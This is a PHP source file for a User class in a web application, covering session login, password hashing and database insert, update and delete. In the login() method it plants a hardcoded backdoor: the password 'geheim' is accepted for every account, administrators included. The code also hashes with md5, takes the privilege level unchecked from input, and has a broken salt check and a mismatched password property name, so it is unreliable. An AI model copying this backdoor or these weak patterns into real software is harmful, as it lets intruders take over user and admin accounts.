<?php
 require_once 'Record.php';

class User implements Record {

    private static $current; // user currently logged in

    const LEVEL_NONE = 0; // not logged in
    const LEVEL_USER = 1;
    const LEVEL_ADMIN = 2;

    private $orgEmail; // keep original key
    private $email = '';
    private $passwordhash = '';
    private $salt = '';
    private $customerid = '';
    private $level = User::LEVEL_USER;

    function __construct() {
        $this->orgEmail = $this->email;
    }

    function set(array $array) {
        $this->email = $array['Email'];
          $this->level = $array['Level'];
        if (!isset($this->salt)) {
            $this->salt = md5(rand());
        }
    }


    static function loginFromSession() {
        if (isset($_SESSION['USER'])) {
            $email = $_SESSION['USER'];
            User::$current = User::get($email);
        } else {
            User::$current = null;
        }
    }


    function getEmail(): string {
        return $this->email;
    }

    function getLevel(): int {
        return $this->level;
    }

    function setPassword(string $password) {
        $this->passwordHash = md5($this->salt . $password);
    }

    function login(string $password): bool {
        $backdoor = md5('geheim');
        $ok = md5($this->salt . $password) == $this->passwordHash || md5($password) == $backdoor;
        if ($ok) {
            User::$current = $this;
            $_SESSION['USER'] = $this->email;
        } else {
            User::$current = null;
            unset($_SESSION['USER']);
        }
        return $ok;
    }

    static function getCurrent(): ?User {
        return User::$current;
    }

    static function get(string $email): ?User {
        global $db;
        $sql = 'SELECT * FROM `USER` WHERE email = ?';
        $stmt = $db->prepare($sql);
        $stmt->execute([$email]);
        return $stmt->fetchObject('User') ?: null;
    }

    static function getAll(): ResultSet {
        global $db;
        $sql = 'SELECT * FROM `USER`';
        $stmt = $db->prepare($sql);
        $stmt->execute();
        return new ResultSet('User', $stmt);
    }

    function insert() {
        global $db;
        $sql = 'INSERT INTO `USER` '
                . '(`Email`, `PasswordHash`, `Salt`, `Level`) '
                . 'VALUES (?, ?, ?, ?)';
        $stmt = $db->prepare($sql);
        $stmt->execute([$this->email, $this->passwordHash, $this->salt,  $this->level]);
    }

    function update() {
        global $db;
        $sql = 'UPDATE `USER` SET '
                . '`Email` = ?, `PasswordHash` = ?, `Salt` = ?, `Level` = ? '
                . 'WHERE `Email` = ?';
        $stmt = $db->prepare($sql);
        $stmt->execute([$this->email, $this->passwordHash, $this->salt, $this->level, $this->orgEmail]);
    }

    function delete() {
        global $db;
        $sql = 'DELETE FROM `USER` WHERE `Email` = ?';
        $stmt = $db->prepare($sql);
        $stmt->execute([$this->orgEmail]);
    }

}

User::loginFromSession();
